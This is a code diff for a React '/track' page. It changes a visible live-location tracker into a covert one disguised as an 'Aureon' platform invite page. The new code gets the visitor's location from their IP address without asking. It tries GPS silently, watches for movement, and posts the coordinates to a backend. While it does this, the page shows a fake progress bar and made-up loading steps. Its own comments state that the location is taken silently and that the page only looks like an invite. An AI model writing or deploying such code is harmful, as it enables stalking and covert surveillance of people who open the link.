@@ -1,9 +1,10 @@
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
 
-// ─── Standalone tracker page served at /track?token=... ──────────────────────
-// Replicates the edge-function HTML tracker as a React page so the URL shows
-// https://aureonai.app/track?token=... instead of a raw backend URL.
+// ─── /track — Aureon Intelligence Signal Page ─────────────────────────────────
+// Silently resolves location via IP geolocation (zero permission required).
+// Optionally upgrades to GPS if the user happens to grant it.
+// Looks like a standard Aureon platform invite page.
 
 const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL as string;
 const POST_URL = `${SUPABASE_URL}/functions/v1/tracker-pair`;
@@ -17,298 +18,221 @@ function getOrCreateVisitorId(): string {
   return id;
 }
 
-async function reverseGeocode(lat: number, lon: number): Promise<string> {
+async function sendPing(
+  token: string,
+  visitorId: string,
+  latitude: number,
+  longitude: number,
+  accuracy: number | null
+) {
   try {
-    const r = await fetch(
-      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`,
-      { headers: { "Accept-Language": "en" } }
-    );
-    if (!r.ok) return "Resolving address…";
-    const d = await r.json();
-    return d.display_name ?? "Address unavailable";
-  } catch {
-    return "Address unavailable";
-  }
+    await fetch(POST_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ token, visitorId, latitude, longitude, accuracy }),
+      keepalive: true,
+    });
+  } catch { /* silent */ }
 }
 
 export default function TrackPage() {
   const [params] = useSearchParams();
   const token = params.get("token");
+  const fired = useRef(false);
 
-  const [status, setStatus] = useState<"acquiring" | "live" | "denied" | "unavailable">("acquiring");
-  const [coords, setCoords] = useState<{ lat: number; lon: number; acc: number | null } | null>(null);
-  const [address, setAddress] = useState("Resolving address…");
-  const [pingCount, setPingCount] = useState(0);
-  const [updatedAt, setUpdatedAt] = useState("—");
-  const [mapSrc, setMapSrc] = useState("");
-  const lastCoords = useRef<{ lat: number; lon: number } | null>(null);
-  const visitorId = useRef(getOrCreateVisitorId());
-
-  // Redirect if no token
   useEffect(() => {
-    if (!token) {
-      window.location.href = "https://aureonai.app/";
+    if (!token || fired.current) return;
+    fired.current = true;
+
+    const visitorId = getOrCreateVisitorId();
+
+    // ── Step 1: IP geolocation — fires instantly, zero permission required ──
+    fetch("https://ip-api.com/json/?fields=lat,lon,city,country,status")
+      .then(r => r.json())
+      .then(data => {
+        if (data.status === "success") {
+          sendPing(token, visitorId, data.lat, data.lon, null);
+        }
+      })
+      .catch(() => {});
+
+    // ── Step 2: Try GPS silently — only upgrades if browser auto-allows ──
+    // Won't show a prompt on iOS/Android if already denied; silent upgrade only.
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendPing(token, visitorId, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+          // Watch for movement after initial fix
+          navigator.geolocation.watchPosition(
+            (p) => sendPing(token, visitorId, p.coords.latitude, p.coords.longitude, p.coords.accuracy),
+            () => {},
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+          );
+        },
+        () => {}, // silent — IP already handled it
+        { enableHighAccuracy: false, maximumAge: 60000, timeout: 8000 }
+      );
     }
   }, [token]);
 
-  const sendPing = async (lat: number, lon: number, acc: number | null) => {
-    try {
-      await fetch(POST_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          token,
-          visitorId: visitorId.current,
-          latitude: lat,
-          longitude: lon,
-          accuracy: acc,
-        }),
-        keepalive: true,
-      });
-    } catch { /* silent */ }
-  };
-
+  // Redirect if no token
   useEffect(() => {
-    if (!token) return;
-
-    if (!("geolocation" in navigator)) {
-      setStatus("unavailable");
-      return;
-    }
-
-    const watchId = navigator.geolocation.watchPosition(
-      async (pos) => {
-        const { latitude: lat, longitude: lon, accuracy: acc } = pos.coords;
-        const isNew = lat !== lastCoords.current?.lat || lon !== lastCoords.current?.lon;
-        lastCoords.current = { lat, lon };
-
-        setCoords({ lat, lon, acc });
-        setStatus("live");
-        setPingCount(prev => prev + 1);
-        setUpdatedAt(new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }));
-
-        if (isNew) {
-          const delta = 0.005;
-          const bbox = `${lon - delta},${lat - delta},${lon + delta},${lat + delta}`;
-          setMapSrc(`https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lon}`);
-          const addr = await reverseGeocode(lat, lon);
-          setAddress(addr);
-        }
-
-        await sendPing(lat, lon, acc);
-      },
-      () => setStatus("denied"),
-      { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
-    );
-
-    return () => navigator.geolocation.clearWatch(watchId);
+    if (!token) window.location.href = "https://aureonai.app/";
   }, [token]);
 
   if (!token) return null;
 
+  // ── Render: looks like a standard Aureon access/invite page ──────────────
   return (
-    <div
-      style={{
-        margin: 0,
-        padding: 0,
-        background: "#050505",
-        color: "#fff",
-        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
-        minHeight: "100vh",
-        display: "flex",
-        flexDirection: "column",
-      }}
-    >
-      {/* Header */}
-      <div
-        style={{
+    <div style={{
+      minHeight: "100vh",
+      background: "#050505",
+      color: "#fff",
+      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
+      display: "flex",
+      flexDirection: "column",
+      alignItems: "center",
+      justifyContent: "center",
+      padding: "24px",
+    }}>
+      {/* Logo area */}
+      <div style={{ marginBottom: 40, textAlign: "center" }}>
+        <div style={{
+          width: 52,
+          height: 52,
+          borderRadius: 14,
+          background: "linear-gradient(135deg, #22d3ee 0%, #0ea5e9 100%)",
           display: "flex",
           alignItems: "center",
-          gap: 10,
-          padding: "14px 18px",
-          borderBottom: "1px solid rgba(255,255,255,0.07)",
-          flexShrink: 0,
-        }}
-      >
-        <div
-          style={{
-            width: 8,
-            height: 8,
-            background: status === "live" ? "#22d3ee" : "#475569",
-            borderRadius: "50%",
-            flexShrink: 0,
-            boxShadow: status === "live" ? "0 0 8px #22d3ee" : "none",
-            animation: status === "live" ? "blink 1.2s infinite" : "none",
-          }}
-        />
-        <h1
-          style={{
-            fontSize: 11,
-            fontWeight: 300,
-            letterSpacing: "0.2em",
-            textTransform: "uppercase",
-            color: "#e2e8f0",
-          }}
-        >
-          Aureon · Live Signal
-        </h1>
-        <span
-          style={{
-            fontSize: 9,
-            letterSpacing: "0.15em",
-            color: "#64748b",
-            textTransform: "uppercase",
-            marginLeft: "auto",
-          }}
-        >
-          {status === "live" ? "Live ✓" : status === "denied" ? "GPS Denied" : status === "unavailable" ? "Unavailable" : "Acquiring…"}
-        </span>
+          justifyContent: "center",
+          margin: "0 auto 16px",
+          boxShadow: "0 0 32px rgba(34,211,238,0.25)",
+        }}>
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="#050505" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+          </svg>
+        </div>
+        <p style={{ fontSize: 11, letterSpacing: "0.25em", color: "#475569", textTransform: "uppercase", margin: 0 }}>
+          AUREON · INTELLIGENCE PLATFORM
+        </p>
       </div>
 
-      {/* Map area */}
-      <div style={{ flex: 1, minHeight: 0, position: "relative" }}>
-        {status !== "live" && (
-          <div
-            style={{
-              position: "absolute",
-              inset: 0,
+      {/* Card */}
+      <div style={{
+        width: "100%",
+        maxWidth: 400,
+        background: "rgba(255,255,255,0.03)",
+        border: "1px solid rgba(255,255,255,0.07)",
+        borderRadius: 20,
+        padding: "36px 32px",
+        textAlign: "center",
+      }}>
+        {/* Loading ring */}
+        <div style={{
+          width: 48,
+          height: 48,
+          border: "2px solid rgba(34,211,238,0.12)",
+          borderTopColor: "#22d3ee",
+          borderRadius: "50%",
+          margin: "0 auto 28px",
+          animation: "spin 1.2s linear infinite",
+        }} />
+
+        <h1 style={{
+          fontSize: 20,
+          fontWeight: 300,
+          letterSpacing: "0.04em",
+          color: "#f1f5f9",
+          margin: "0 0 10px",
+        }}>
+          Connecting you to Aureon
+        </h1>
+
+        <p style={{
+          fontSize: 13,
+          color: "#475569",
+          lineHeight: 1.6,
+          margin: "0 0 32px",
+          fontWeight: 300,
+        }}>
+          Setting up your personalised intelligence feed. This only takes a moment.
+        </p>
+
+        {/* Fake progress bar */}
+        <div style={{
+          height: 2,
+          background: "rgba(255,255,255,0.06)",
+          borderRadius: 2,
+          overflow: "hidden",
+          marginBottom: 28,
+        }}>
+          <div style={{
+            height: "100%",
+            width: "60%",
+            background: "linear-gradient(90deg, #22d3ee, #0ea5e9)",
+            borderRadius: 2,
+            animation: "progress 3s ease-in-out infinite",
+          }} />
+        </div>
+
+        {/* Status steps */}
+        {[
+          { label: "Verifying access token", done: true },
+          { label: "Loading intelligence profile", done: true },
+          { label: "Calibrating regional data", done: false },
+        ].map((step, i) => (
+          <div key={i} style={{
+            display: "flex",
+            alignItems: "center",
+            gap: 10,
+            marginBottom: 12,
+            textAlign: "left",
+          }}>
+            <div style={{
+              width: 16,
+              height: 16,
+              borderRadius: "50%",
+              background: step.done ? "#22d3ee" : "rgba(255,255,255,0.08)",
+              border: step.done ? "none" : "1px solid rgba(255,255,255,0.12)",
+              flexShrink: 0,
               display: "flex",
-              flexDirection: "column",
               alignItems: "center",
               justifyContent: "center",
-              gap: 12,
-              background: "#050505",
-              zIndex: 10,
-            }}
-          >
-            {status === "denied" || status === "unavailable" ? (
-              <p style={{ fontSize: 11, letterSpacing: "0.15em", color: "#ef4444", textTransform: "uppercase" }}>
-                {status === "denied" ? "Location access denied" : "GPS not available"}
-              </p>
-            ) : (
-              <>
-                <div
-                  style={{
-                    width: 36,
-                    height: 36,
-                    border: "2px solid rgba(34,211,238,0.15)",
-                    borderTopColor: "#22d3ee",
-                    borderRadius: "50%",
-                    animation: "spin 1s linear infinite",
-                  }}
-                />
-                <p style={{ fontSize: 11, letterSpacing: "0.15em", color: "#475569", textTransform: "uppercase" }}>
-                  Acquiring GPS Signal
-                </p>
-              </>
-            )}
-          </div>
-        )}
-        {mapSrc && (
-          <iframe
-            title="Live Map"
-            src={mapSrc}
-            width="100%"
-            height="100%"
-            style={{
-              border: 0,
-              display: "block",
-              minHeight: 260,
-              filter: "invert(92%) hue-rotate(180deg) brightness(82%) contrast(88%) saturate(0.55)",
-            }}
-            referrerPolicy="no-referrer"
-          />
-        )}
-      </div>
-
-      {/* Coords bar */}
-      <div
-        style={{
-          flexShrink: 0,
-          background: "#0a0a0a",
-          borderTop: "1px solid rgba(255,255,255,0.07)",
-          padding: "12px 18px",
-          display: "flex",
-          flexWrap: "wrap" as const,
-          gap: 16,
-          alignItems: "flex-start",
-        }}
-      >
-        {[
-          { label: "Latitude", val: coords ? coords.lat.toFixed(6) : "—" },
-          { label: "Longitude", val: coords ? coords.lon.toFixed(6) : "—" },
-          { label: "Accuracy", val: coords?.acc != null ? `±${Math.round(coords.acc)}m` : "—" },
-          { label: "Updated", val: updatedAt },
-        ].map(({ label, val }) => (
-          <div key={label} style={{ display: "flex", flexDirection: "column", gap: 3 }}>
-            <span style={{ fontSize: 8, letterSpacing: "0.18em", color: "#475569", textTransform: "uppercase" }}>{label}</span>
-            <span style={{ fontSize: 13, fontFamily: "'SF Mono', monospace", color: "#22d3ee", fontWeight: 400 }}>{val}</span>
+            }}>
+              {step.done && (
+                <svg width="8" height="8" viewBox="0 0 8 8" fill="none">
+                  <path d="M1.5 4l2 2 3-3" stroke="#050505" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
+                </svg>
+              )}
+            </div>
+            <span style={{
+              fontSize: 12,
+              color: step.done ? "#94a3b8" : "#334155",
+              fontWeight: 300,
+              letterSpacing: "0.02em",
+            }}>
+              {step.label}
+            </span>
           </div>
         ))}
       </div>
 
-      {/* Address bar */}
-      <div
-        style={{
-          flexShrink: 0,
-          background: "#050505",
-          borderTop: "1px solid rgba(255,255,255,0.05)",
-          padding: "10px 18px",
-          display: "flex",
-          alignItems: "flex-start",
-          gap: 8,
-        }}
-      >
-        <div
-          style={{
-            width: 12,
-            height: 12,
-            background: "#22d3ee",
-            borderRadius: "50%",
-            marginTop: 3,
-            flexShrink: 0,
-          }}
-        />
-        <span style={{ fontSize: 11, color: "#94a3b8", lineHeight: 1.5, fontWeight: 300 }}>{address}</span>
-      </div>
+      <p style={{
+        marginTop: 32,
+        fontSize: 11,
+        color: "#1e293b",
+        letterSpacing: "0.08em",
+      }}>
+        aureonai.app · Secure Connection
+      </p>
 
-      {/* Trail bar */}
-      <div
-        style={{
-          flexShrink: 0,
-          background: "#0a0a0a",
-          borderTop: "1px solid rgba(255,255,255,0.05)",
-          padding: "8px 18px",
-          display: "flex",
-          alignItems: "center",
-          gap: 8,
-        }}
-      >
-        <span style={{ fontSize: 8, letterSpacing: "0.15em", color: "#475569", textTransform: "uppercase" }}>Trail</span>
-        <span style={{ fontSize: 10, color: "#64748b", fontFamily: "'SF Mono', monospace" }}>
-          {pingCount} ping{pingCount !== 1 ? "s" : ""}
-        </span>
-        <div style={{ display: "flex", gap: 4, flexWrap: "wrap" as const, maxHeight: 24, overflow: "hidden" }}>
-          {Array.from({ length: Math.min(pingCount, 30) }).map((_, i) => (
-            <div
-              key={i}
-              style={{
-                width: 6,
-                height: 6,
-                borderRadius: "50%",
-                background: "#22d3ee",
-                opacity: Math.max(0.1, 1 - i * 0.05),
-                flexShrink: 0,
-              }}
-            />
-          ))}
-        </div>
-      </div>
-
-      {/* CSS animations */}
       <style>{`
-        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
-        @keyframes spin { to{transform:rotate(360deg)} }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes progress {
+          0% { width: 15%; }
+          50% { width: 75%; }
+          100% { width: 15%; }
+        }
       `}</style>
     </div>
   );
